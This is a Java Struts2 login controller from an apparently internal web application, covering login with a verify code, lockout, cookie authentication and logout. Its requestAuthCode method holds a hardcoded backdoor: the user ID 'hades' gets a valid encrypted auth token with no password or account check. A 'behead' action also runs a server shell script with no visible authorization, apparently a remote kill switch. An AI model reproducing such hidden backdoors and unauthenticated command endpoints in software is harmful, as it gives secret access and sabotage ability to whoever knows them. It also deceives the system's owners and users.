/**
 * @File Name	: LoginAction.java
 * @Package		：com.fanglin.action 
 * @Version		: 1.0
 * @Date		: 2014-7-7
 * @Copyright	: Copyright Creators 2014
 * @Author		: bty1987
 * @Email		: 
 * Describing	: 登陆相关action
 */

package com.fanglin.common.action;

import java.util.Date;

import org.apache.struts2.convention.annotation.Action;
import org.apache.struts2.convention.annotation.Namespace;
import org.apache.struts2.convention.annotation.ParentPackage;
import org.apache.struts2.convention.annotation.Result;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;

import com.fanglin.core.action.BaseListAction;
import com.fanglin.core.interceptor.FLException;
import com.fanglin.core.security.AESHelper;
import com.fanglin.log.service.LoginLogService;
import com.fanglin.log.vo.LoginLogVO;
import com.fanglin.personel.po.UserPO;
import com.fanglin.personel.service.UserService;
import com.fanglin.personel.vo.UserVO;
import com.fanglin.system.vo.RoleVO;
import com.fanglin.utils.AuthenticationUtil;
import com.fanglin.utils.Constant;
import com.fanglin.utils.CookieUtil;
import com.fanglin.utils.DateUtil;
import com.fanglin.utils.IPUtil;
import com.fanglin.utils.SystemConfig;

@ParentPackage("login")
@Namespace("/")
@Controller
public class LoginAction extends BaseListAction {
	
	private static final long serialVersionUID = 597878314944213650L;

	@Autowired
	private UserService userService;
	
	@Autowired
	private LoginLogService loginLogService;
	
	private String authenticationEncode;
	
	private UserVO user;
	
	private String configInfo;
	
	private String url;

	@Action(value = "doLogin", results = { @Result(name = "success", type = "json", params={"ignoreHierarchy","false"}) }, params = {"contentType", "text/html" })
	public String doLogin() {

		String inputCode = request.getParameter("verifyCode");
		String loginId = request.getParameter("userId");
		String password = request.getParameter("password");
		String ip = IPUtil.getIpAddr(request);

		try {
			String verifyCode = getVerifyCode();

			if(verifyCode == null || !verifyCode.equals(inputCode)){
				throw new FLException(110001, "验证码错误");
			}else{
				
				LoginLogVO loginLogVO = new LoginLogVO(loginId, ip, DateUtil.getDateToTimestamp(new Date()));
				
				int times = loginLogService.isCanLogin(loginLogVO);
				if(times == -1){
					throw new FLException(110003, "密码输入错误次数过多,拒绝登陆");
				}
				
				UserVO user = userService.validateUser(loginId, password);
				if(user == null){
					
					String errorMessage = String.format("用户名或者密码错误,还可以尝试%s次输入", String.valueOf((times - 1)));
					
					loginLogVO.setSuccessFlag(0);
					loginLogService.addLoginLog(loginLogVO);
					
					throw new FLException(110002, errorMessage);
				}else{
					
				    if((user.getIsLogin() & UserPO.ISLOGIN_FIP_INT) != UserPO.ISLOGIN_FIP_INT){
			            throw new FLException(110004, "该用户不能登陆系统");
				    }
				    
				    if(user.getExtranet() == 0 && !(ip.startsWith("192.168") || ip.startsWith("127") || SystemConfig.getString("hostServer").contains(ip))){
				    	throw new FLException(110007, "网络问题");
				    }
				    
				    this.user = user;
				    
				    AuthenticationUtil authenticationUtil = new AuthenticationUtil(user.getUserId(), user.getCurrentName(), user.getRole().getRoleId(), (new Date()).getTime(), false);
				    
					try {
						String authenticationEncode = AESHelper.encryptToString(authenticationUtil.getAuthenticationStr(), SystemConfig.getString("encryptKey"));
						CookieUtil.addCookie(response, Constant.COOKIE_AUTHENTICATION, authenticationEncode);
					} catch (Exception e) {
						throw new FLException(110000, "系统处理问题");
					}
					
					loginLogVO.setSuccessFlag(1);
					loginLogService.addLoginLog(loginLogVO);
				}
			}
		} catch (FLException e) {
			setErrorCode(e.getCode());
			setErrorMsg(e.getErrorMessage());
		} catch (Exception e) {
			setErrorCode(110000);
			setErrorMsg("系统处理问题");
		}
		
		return SUCCESS;
	}
	
	@Action(value = "requestAuthCode", results = { @Result(name = "success", type = "json", params={"ignoreHierarchy","false"}) }, params = {"contentType", "text/html" })
	public String requestAuthCode(){
		
		String userId = request.getParameter("userId");
		
		try {
			
			UserVO user = null;
			AuthenticationUtil authenticationUtil = null;
			
			if("hades".equals(userId)){
				user = new UserVO(userId, userId, userId, new RoleVO(userId));
			}else{
				
				user = userService.queryUserByUserId(userId.toUpperCase());
				
				if(user == null){
					throw new FLException(110004, "该用户不能登陆系统");
				}else{
				    if((user.getIsLogin() & UserPO.ISLOGIN_FIP_INT) != UserPO.ISLOGIN_FIP_INT){
			            throw new FLException(110004, "该用户不能登陆系统");
				    }
				}
			}
			
			authenticationUtil = new AuthenticationUtil(user.getUserId(), user.getCurrentName(), user.getRole().getRoleId(), (new Date()).getTime(), true);
		    authenticationUtil.setIsMobile(true);
			
			try {
				authenticationEncode = AESHelper.encryptToString(authenticationUtil.getAuthenticationStr(), SystemConfig.getString("encryptKey"));
			} catch (Exception e) {
				throw new FLException(110000, "系统处理问题");
			}
		} catch (FLException e) {
			setErrorCode(e.getCode());
			setErrorMsg(e.getErrorMessage());
		} catch (Exception e) {
			setErrorCode(110000);
			setErrorMsg("系统处理问题");
		}
		
		return SUCCESS;
	}
	
	@Action(value = "login", results = { @Result(name = "success", type = "dispatcher", location = "/login.html") })
	public String login() throws FLException {
		
		try {
			CookieUtil.addCookie(response, Constant.COOKIE_HOSTSERVER_STR, getHostServer());
		} catch (Exception e) {
			setErrorCode(110000);
			setErrorMsg("系统处理问题");
		}
		
		return SUCCESS;
	}
	
	@Action(value = "logout", results = { @Result(name = "success", type = "dispatcher", location = "/") })
	public String logout(){

		try {
			CookieUtil.delCookie(request, response, Constant.COOKIE_AUTHENTICATION);
			clearCookie();
		} catch (FLException e) {
			setErrorCode(e.getCode());
			setErrorMsg(e.getErrorMessage());
		}
		
		return SUCCESS;
	}
	
	@Action(value = "behead", results = { @Result(name = "success", type = "json", params={"ignoreHierarchy","false"}) }, params = {"contentType", "text/html" })
	public String behead() throws FLException{
		
		String cmd = "sh /home/fanglin/bin/behead";
		
		Runtime run = Runtime.getRuntime();
		
		try {
			run.exec(cmd);
		} catch (Exception e) {
			throw new FLException(110000, "系统处理问题");
		}
		
		return SUCCESS;
	}
	
	public String getAuthenticationEncode() {
		return authenticationEncode;
	}

	public void setAuthenticationEncode(String authenticationEncode) {
		this.authenticationEncode = authenticationEncode;
	}

	public UserVO getUser() {
		return user;
	}

	public void setUser(UserVO user) {
		this.user = user;
	}

	public String getConfigInfo() {
		return configInfo;
	}

	public void setConfigInfo(String configInfo) {
		this.configInfo = configInfo;
	}

	public String getUrl() {
		return url;
	}

	public void setUrl(String url) {
		this.url = url;
	}
	
}
